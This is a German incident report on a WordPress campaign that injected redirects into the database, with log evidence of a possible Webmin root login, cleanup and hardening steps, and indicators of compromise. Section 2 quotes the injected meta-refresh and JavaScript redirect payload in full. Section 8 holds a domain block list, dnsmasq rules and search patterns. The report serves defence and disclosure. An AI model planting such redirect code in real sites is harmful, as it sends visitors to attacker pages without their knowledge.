# Vorfallsbericht — WordPress-Weiterleitung per Datenbankinjektion

Betroffener Host: Ubuntu 24.04 bei einem europäischen Anbieter, MariaDB 10.11,
Virtualmin/Webmin mit Jailkit, rund dreißig Domains und zehn
WordPress-Installationen unter `/home/<benutzer>/public_html[/wordpress]`.
Zeitraum: August 2026.

Dieser Bericht ist deutsch; die Skriptausgaben sind englisch.

Alle eigenen Domains, Benutzernamen und Adressen sind in diesem Bericht durch
Platzhalter ersetzt. Die Angreiferdomains stehen im Klartext, damit sie
blockiert werden können — siehe [Indikatoren](#indikatoren).

---

## 1. Symptom

Die Startseite einer WordPress-Seite leitete nach etwa sieben Sekunden auf eine
fremde Kurz-URL weiter. Auf Mobilgeräten sofort.

Erste Eingrenzung: Eine Verzögerung von Sekunden spricht für eingeschleustes
JavaScript im Seiteninhalt, nicht für eine Weiterleitung per `.htaccess` oder
HTTP-Header. Bestätigt durch:

```bash
curl -sI https://BEISPIEL.TLD/ | grep -i location    # kein Location-Header
```

## 2. Die Nutzlast

Jeder Zeile in `wp_posts.post_content` war derselbe Block vorangestellt:

```html
<meta http-equiv="refresh" content="7; url=https://ushort.company/TOKEN" />
<script>(window.matchMedia("(pointer:coarse)").matches
  ||/Android|iPhone|iPad|.../i.test(navigator.userAgent))
  &&location.replace("https://ushort.company/TOKEN");</script>\r\n
```

Der `<meta>`-Tag greift bei Desktop-Besuchern nach sieben Sekunden, das Skript
leitet Touch-Geräte sofort um. Nach dem Block folgt ein `\r\n`, dann der echte
Inhalt — diese Trennstelle wurde zum Ansatzpunkt der Bereinigung.

Betroffene Zeilenzahl auf einer einzelnen Seite: 955, davon 935 nach dem
Grundmuster. Der Großteil entfiel auf Wegwerf-Typen (`oembed_cache`,
`customize_changeset`, `request`); echte Inhalte waren es nur eine Handvoll.

## 3. Beweisführung: Datenbankzugriff, kein PHP-Backdoor

| Beobachtung | Schlussfolgerung |
|---|---|
| `post_modified` unverändert, Zeilen von 2022 betroffen | WordPress hat nicht gespeichert |
| `wp_global_styles`, `wp_navigation`, `oembed_cache` betroffen | Zeilentypen, die WordPress so nie schreibt |
| `wp core verify-checksums` sauber, keine mu-plugins, kein `eval`/`base64_decode` | keine veränderte Datei |
| `home` in `wp_options` auf die Schaddomain umgebogen | ein einzelnes `UPDATE` |

Der Eintrag, der es endgültig zeigte: ein Auto-Draft mit
`guid = https://ushort.company/TOKEN/?p=33`. WordPress bildet guids aus der
`home`-Option — die war also bereits verbogen, als die Zeile entstand.

## 4. Einstiegsweg

Webmin war aus dem Internet auf Port 10000 erreichbar. Webmin läuft als root.

Die Auswertung von `/var/webmin/webmin.log` ergab für den fraglichen Tag:

```
15:18:18  root  -           <IP>  record-failed.pl "failed" "-" "wrongpass"
15:18:26  root  <sessionid> <IP>  record-login.pl  "login"
15:41:39  root  <sessionid> <IP>  record-login.pl  "login"
```

Ein Fehlversuch, acht Sekunden später erfolgreicher root-Login. Die Adresse
erschien im gesamten Log **genau an diesem Tag** und nie sonst.

`/var/webmin/miniserv.log` zeigte für diese Sitzungen unter anderem:

```
"GET  /xterm
"POST /xterm/
"GET  /authentic-theme/ws-555
"GET  /postfix/
"GET  /fail2ban/
"GET  /virtual-server/index.cgi
```

Also eine **Browser-Shell mit root-Rechten**, dazu ein Blick in Mailserver-
und Firewall-Konfiguration. Kein Aufruf des MySQL-Moduls — die Injektion lief
demnach aus der Shell heraus, was zum konsistenten Muster über alle Seiten passt.

### Wichtige Einschränkung

Die Adresse gehörte zum Netz eines Unternehmens-Sicherheitsproxys (Zscaler,
`136.226.0.0/16`, AS22616). Solche Proxys laufen als Client-Agent **auf dem
Endgerät** und leiten dessen gesamten Verkehr um — unabhängig vom benutzten
Netzwerk. Greift man mit einem dienstlichen Notebook über einen privaten
Mobilfunk-Hotspot zu, erscheint dessen Ausgangsknoten als Quelladresse und
nicht der Mobilfunkanbieter.

Ein Tippfehler mit acht Sekunden Abstand zum richtigen Passwort ist zudem
menschliches, kein maschinelles Verhalten; ein Brute-Force-Angriff hinterlässt
hunderte Fehlversuche.

**Der Zugriff konnte damit nicht abschließend als Fremdzugriff belegt werden.**
Die Prüfung, ob auf dem betreffenden Notebook ein solcher Agent läuft, ist der
entscheidende Schritt:

```powershell
Get-Process | Where-Object { $_.Name -like "*Zscaler*" }
curl.exe -4 ifconfig.me      # über denselben Hotspot wie damals
```

Wichtig ist die Lehre unabhängig vom Ergebnis: Ein aus dem Internet
erreichbares Webmin mit Terminal-Modul bedeutet, dass ein einziges bekanntes
Passwort für vollständigen root-Zugriff genügt.

## 5. Weitere Befunde

**Zieldomain unterscheidet sich pro Seite.** Drei betroffene Installationen
verwiesen auf drei verschiedene Domains derselben Kampagne. Ein Scan mit fest
vorgegebener Domain meldet betroffene Seiten fälschlich als sauber. Konsequenz:
Das Bereinigungsskript erkennt die Domain selbst aus der Nutzlast.

**Verwaiste WP-Cron-Hooks.** Auf einer Installation fanden sich zwei stündliche
Hooks mit Zufallsnamen (`hzorj91jc31tmgsbtay`, `bxh99t23xbwpt17gva`) ohne
registrierenden Code. Ohne Code am Hook passiert nichts — aber der Name ist ein
zuverlässiger Marker, und die Einträge stammen aus einem direkten Schreibvorgang
in `wp_options.cron`.

**Zwischengespeichertes oEmbed-Markup.** Während `home` verbogen war, baute
WordPress seine Embed-Caches gegen die Schaddomain:

```html
<blockquote class="wp-embedded-content" data-secret="…">…</blockquote>
<iframe … style="… visibility: hidden;" …></iframe>
```

Maschinell erzeugt, kein eigener Text — wird als vierter Durchgang
herausgeschnitten.

**mod_php serverweit aktiviert — zwei Tage nach dem Vorfall.** In
`/etc/apache2/mods-enabled/` tauchten `php8.3.load` und `php8.3.conf` mit dem
Datum des zweiten Tages nach dem Einbruch auf. Der Host arbeitet eigentlich
mit `mod_fcgid` und suexec, sodass PHP unter dem jeweiligen Seitenbenutzer
läuft. `mod_php` setzt das per `SetHandler` ausser Kraft — danach lief PHP auf
**allen** Seiten als `www-data`.

Die Auswirkungen waren zunächst schwer zuzuordnen, weil sie wie drei
unabhängige Probleme aussahen:

- Medien-Uploads scheiterten mit „The uploaded file could not be moved to
  wp-content/uploads/…"
- WordPress fragte bei Aktualisierungen wieder nach FTP-Zugangsdaten
- `WP_DEBUG_LOG` legte keine Datei an

Alle drei haben dieselbe Ursache: Der PHP-Prozess war nicht mehr Eigentümer
der Dateien. Sicherheitlich ist die Änderung erheblicher als der reine
Betriebsausfall — sie hebt die Trennung zwischen den Seiten auf. Unter
`mod_php` teilen sich alle Domains eine Prozessidentität, sodass Code einer
kompromittierten Seite auf die Dateien aller anderen zugreifen kann.

Ob die Module bewusst durch eigene Arbeit aktiviert wurden oder nicht, war zum
Zeitpunkt des Berichts nicht abschliessend geklärt. Prüfschritte:

```bash
grep -i 'php8' /var/log/apt/history.log | tail
ls -la /etc/apache2/mods-enabled/php*.*
```

Behoben mit:

```bash
a2dismod php8.3 && apachectl configtest && systemctl restart apache2
```

Kontrolle, dass PHP wieder unter dem Seitenbenutzer läuft:

```php
<?php echo posix_getpwuid(posix_geteuid())['name'];
```

**Datenbank-Dumps im Webverzeichnis.** Unter `public_html/wordpress/tmp/` lagen
`.sql`-Sicherungen — über den Browser abrufbar und mit Passwort-Hashes darin.
Seither prüft das Skript den Webroot auf Dumps, Archive und phar-Dateien.

**Private SSH-Schlüssel ohne Passphrase auf dem Server.** Virtualmin legt beim
Anlegen einer Domain ein Schlüsselpaar an — der private Teil bleibt im
Home-Verzeichnis liegen:

```bash
head -2 /home/<benutzer>/.ssh/id_rsa
# openssh-key-v1 … "none" für Cipher und KDF = unverschlüsselt
```

Damit hätte jeder mit root-Zugriff sämtliche privaten Schlüssel mitnehmen
können. Eine unauffällige `authorized_keys`-Liste ist deshalb allein keine
Entwarnung. Die privaten Schlüssel werden auf dem Server nicht gebraucht und
gehören auf den Arbeitsplatzrechner.

**`/etc/webmin/miniserv.users` war sauber** — alle Einträge entsprachen
vorhandenen Domains, nur `root` mit eigenem Passwort, die übrigen gegen die
Unix-Konten. Kein angelegtes Fremdkonto. Ebenso keine fremden Einträge in
`authorized_keys`.

**Fehldiagnose vermieden.** Nach dem Umzug einer Installation in ein
Unterverzeichnis meldete `wp core verify-checksums` eine Abweichung bei
`index.php`. Das war die eigene Anpassung des `require`-Pfads, kein Schadcode —
vor dem Überschreiben mit `wp core download --force` bewahrt.

Daraus folgt eine Aenderung an den Werkzeugen: Bei diesem Layout ist der Loader
im Webroot **immer** veraendert, die Pruefsumme kann dort nie stimmen. Statt die
Meldung pauschal zu unterdruecken (was echten Schadcode an derselben Stelle
verdeckt haette), laufen die Pruefsummen jetzt gegen das
Installationsverzeichnis, und der Loader wird inhaltlich bewertet: Ein Loader
besteht aus zwei Anweisungen. Alles darueber hinaus — nachgeladener Code,
Weiterleitungen, abweichende Include-Ziele, mehr als 15 Zeilen — ist ein
Befund.

**Root-eigene Dateien nach Reparaturarbeiten.** Auf mehreren Installationen
gehörte der komplette WordPress-Kern anschließend root statt dem
Seitenbenutzer — Folge eines `wp core download` bzw. eines Skriptlaufs als
root. Die Symptome wirken wie getrennte Probleme, haben aber dieselbe Ursache:

| Betroffener Bereich | Symptom |
|---|---|
| Kern (`wp-admin`, `wp-includes`, Wurzel) | Aktualisierungen fragen nach FTP-Zugangsdaten |
| `wp-content/uploads` | Medien-Uploads scheitern |
| generierte Theme-Assets | Seite verliert ihre Formatierung |

Uploads und Updates brechen unabhängig voneinander: Für Uploads genügt
Schreibrecht in `uploads/`, für Updates muss der gesamte Kern dem
Seitenbenutzer gehören. Eine Seite konnte deshalb Dateien hochladen und
trotzdem nach FTP fragen.

Seither prüft `wp-fix-ownership` das über alle Seiten hinweg und weist den
betroffenen Bereich aus. Zur Nachkontrolle ruft es `get_filesystem_method()`
auf — dieselbe Funktion, mit der WordPress über die FTP-Abfrage entscheidet.

**Mailversand unauffällig.** `mailq` leer, keine Hinweise auf Missbrauch als
Spam-Relais.

## 6. Erfolgreiche Maßnahmen

### Bereinigung

1. **`home`/`siteurl` korrigiert.** Ursache für fehlende Formatierung: Alle
   Assets wurden mit der Schaddomain als Basis ausgeliefert und liefen ins
   Leere. Notfallweg über `wp-config.php`:
   ```php
   define('WP_HOME','https://BEISPIEL.TLD');
   define('WP_SITEURL','https://BEISPIEL.TLD/wordpress');
   ```
2. **Nutzlast aus `post_content` entfernt** — in vier Durchgängen, vom engsten
   zum weitesten (siehe README).
3. **Wegwerf-Zeilen gelöscht**, echte Inhalte behalten. Leere Beiträge und
   Seiten in den Papierkorb statt endgültig weg.
4. **guids repariert**, Auto-Drafts des Angreifers entfernt.
5. **Cron-Hooks entfernt**, nachdem geprüft war, dass kein Code sie neu anlegt.
6. **Caches geleert** — Objektcache, Transients, Seitencache, zusammengeführte
   Theme-Assets, opcache per FPM-Reload.

### Wichtige Erkenntnis zur Verifikation

Nach der Bereinigung leitete der Browser weiter, obwohl der Server sauberes
HTML lieferte (`curl … | grep -c <domain>` ergab 0). Eine Meta-Refresh-Seite ist
voll cachefähig. Nach dem Leeren des Browsercaches war die Weiterleitung weg.
Seither prüft das Skript zusätzlich alle eingebundenen CSS/JS-Dateien und weist
auf genau diesen Fall hin.

### Absicherung

**Webmin aus dem Internet genommen** — die zentrale Maßnahme:

```
/etc/webmin/miniserv.conf:  bind=127.0.0.1
/etc/webmin/restart
```

Zugriff seither per SSH-Tunnel; die Protokolle zeigen ab diesem Zeitpunkt
ausschließlich `127.0.0.1` als Quelle. Entscheidendes Detail: Im Tunnel **und**
im Browser `127.0.0.1` verwenden, nicht `localhost`. Letzteres löst zuerst auf
`::1` auf, dort lauscht Webmin nach `bind=127.0.0.1` nicht mehr — Fehlerbild
`PR_CONNECT_RESET_ERROR`. In MobaXterm gehört `127.0.0.1` ins rechte Feld
(Remote server).

**Cloud-Firewall ergänzt.** Sie arbeitet als Default-Deny: Nach dem Anlegen
einer Regel für Port 10000 war SSH gesperrt und der Tunnel weg. Alle benötigten
Ports explizit freigeben — 22, 80, 443, 25 und weitere — und jede Regel für
`0.0.0.0/0` **und** `::/0`, da der Host per IPv6 angebunden ist.

**Weiteres:** Datenbankpasswörter rotiert, `wp config shuffle-salts`,
`wp-config.php` auf Modus 640, Dumps aus dem Webverzeichnis entfernt, WP-CLI von
2.6.0 (2022) aktualisiert, gefährliche Webmin-Module (`xterm`, `filemin`,
`custom`, `shell`, `mysql`) für den root-Benutzer entfernt.

## 7. Stolperfallen im Verlauf

| Symptom | Ursache |
|---|---|
| `wp: command not found` | WP-CLI nicht installiert |
| `Could not open input file: /usr/local/bin/wp` | Datei existiert, ist für das Konto aber nicht nutzbar → Kopie ins Home |
| `WP-CLI cannot read this install` | falscher Pfad oder `wp-config.php` nicht lesbar |
| `sudo: unable to execute ./script: Permission denied` | Skript in `/root` (Modus 700) → nach `/usr/local/bin` |
| `X is not in the sudoers file` | `sudo -u` als Nicht-root aufgerufen |
| `could not read cron events` / `users` | WP-CLI 2.6 liefert bei `--fields` + `--format=csv` nichts |
| Rollback trotz korrektem Schreibvorgang | Kontrolle nutzte das Passwort als Regex; `.` `*` `+` `^` sind Metazeichen |
| `curl 404` beim WP-CLI-Download | Builds liegen unter `wp-cli/builds`, nicht `wp-cli/wp-cli` |
| `grep: binary file matches` | Logdatei enthält Binärzeichen → `grep -a` |
| Seite ohne Formatierung | `home`/`siteurl` verbogen |
| Weiterleitung trotz sauberem `curl` | Browsercache |
| Upload scheitert, Updates fragen nach FTP | `mod_php` aktiv statt fcgid → PHP läuft als `www-data` |
| Upload geht, Update fragt trotzdem nach FTP | Kern gehört root, `uploads` dem Seitenbenutzer |
| `Option FollowSymLinks not allowed here` | `AllowOverride`-Whitelist des Panels enthält sie nicht |
| Firewall-Regel sperrt eigenen Zugang | Default-Deny, und IPv4/IPv6 getrennt gepflegt |

## 8. Indikatoren

### Domains der Kampagne

Im eigenen Vorfall beobachtet:

```
urshort.com
ushort.company
ushort.org
```

Ein Sicherheitsforscher (Sal Aguilar, WPSecurityAnalyzer) dokumentierte im Mai
2026 dieselbe Kampagne und nannte zusätzlich:
ushort.observer, ushort.info, u-short.net, urshort.live, ushort.today,
ushort.com und ushort.dev — die Weiterleitung wurde dabei auch ans Ende von
JS-Dateien angehängt und über gefälschte „Coming soon"-Seiten in htm-, html- und
php-Dateien verbreitet.

Zusammengefasste Sperrliste:

```
u-short.net
urshort.com
urshort.live
ushort.com
ushort.company
ushort.dev
ushort.info
ushort.observer
ushort.org
ushort.today
```

> `ushort.com` vor dem Sperren prüfen — kurze, generische Domains wechseln den
> Besitzer, und eine Fehlsperre fällt im Betrieb erst spät auf.

Die Pfade folgen dem Muster `/[A-Za-z0-9]{10}` mit angehängter Kennung
(`0r2`, `0r3`, `0r4`, `0r5`), die offenbar die Kampagnenwelle nummeriert.

### Beispiel: dnsmasq / Unbound

```
# /etc/dnsmasq.d/blocklist-ushort.conf
address=/u-short.net/0.0.0.0
address=/urshort.com/0.0.0.0
address=/urshort.live/0.0.0.0
address=/ushort.company/0.0.0.0
address=/ushort.dev/0.0.0.0
address=/ushort.info/0.0.0.0
address=/ushort.observer/0.0.0.0
address=/ushort.org/0.0.0.0
address=/ushort.today/0.0.0.0
```

### Suchmuster in Datenbank und Dateisystem

```sql
SELECT COUNT(*) FROM wp_posts WHERE post_content LIKE '<meta http-equiv=%';
SELECT option_name FROM wp_options WHERE option_value LIKE '%ushort%';
```

```bash
grep -rlE 'ushort|urshort|u-short' /pfad/zur/installation
grep -rn 'window.location.href *= *"//' --include='*.js' /pfad/zur/installation
find . -iname '*coming*soon*' -o -iname 'index.htm'
```

### Aus dem Kampagnenbericht abgeleitete Ergaenzungen

Der Bericht nennt zwei Verbreitungswege, die eine reine Datenbankbereinigung
nicht erfasst — beide sind seither eigene Pruefungen (`wp-asset-scan`):

**Weiterleitung ans Ende von JS-Dateien.** Der Code wird an bestehende,
legitime Skripte angehaengt. Ein `grep` auf eine einzelne Domain findet ihn
nur zufaellig; zuverlaessig ist der Blick auf die letzten Bytes jeder Datei.
Staerkster Einzelmarker ist das doppelte `//` vor dem Protokoll
(`"//https://…"`) — so schreibt kein Entwickler eine URL.

**Gefaelschte Landeseiten** als `.htm`, `.html` und `.php`. In einer
WordPress-Installation sind statische HTML-Dateien ohnehin unueblich; eine
mit Meta-Refresh oder `location`-Zuweisung ist praktisch immer boesartig.

Zwei Konsequenzen fuer die Werkzeuge:

- **Generisch statt domainspezifisch pruefen.** Die Kampagne nutzt mindestens
  zehn Domains und wechselt sie pro Seite. Muster (`<meta http-equiv=`,
  `"//http`, Zufallsnamen bei Cron-Hooks) halten laenger als eine Domainliste.
- **Zeilenweises Loeschen ist bei JS gefaehrlich.** Minifizierte Dateien
  bestehen oft aus einer einzigen Zeile; wird die Injektion daran angehaengt,
  zerstoert ein `grep -v` das gesamte Skript. Herausgeschnitten wird deshalb
  gezielt die eingeschleuste Anweisung, mit Sicherung daneben.

### Weitere Marker

- WP-Cron-Hooks mit Zufallsnamen: 12+ Zeichen, Buchstaben und Ziffern gemischt,
  keine Trennzeichen
- `home` und `siteurl` verweisen auf verschiedene Hosts
- `post_content` beginnt mit `<meta http-equiv="refresh"`
- Auto-Drafts, deren `guid` eine fremde Domain enthält

## 9. Offene Punkte

- [ ] Herkunft des root-Logins abschließend klären (Proxy-Agent auf dem
      Notebook?)
- [ ] Private SSH-Schlüssel vom Server entfernen, Schlüsselpaare erneuern
- [ ] Passwörter aller Panel-Konten wechseln, nicht nur root
- [ ] Kontrolllauf `wp-db-audit` und `wp-asset-scan` nach einer Stunde und am
      Folgetag

Steigt die Fundzahl wieder, besteht der Zugang weiter — dann die Seite offline
nehmen statt erneut zu bereinigen.

Zur Einordnung: Solange nicht geklärt ist, ob die root-Sitzung fremd war, bleibt
die Bereinigung im laufenden System eine Wette. Bei bestätigtem Fremdzugriff mit
Terminal ist ein Neuaufbau die einzige belastbare Konsequenz — Inhalte
zurückspielen, niemals ausführbare Dateien.
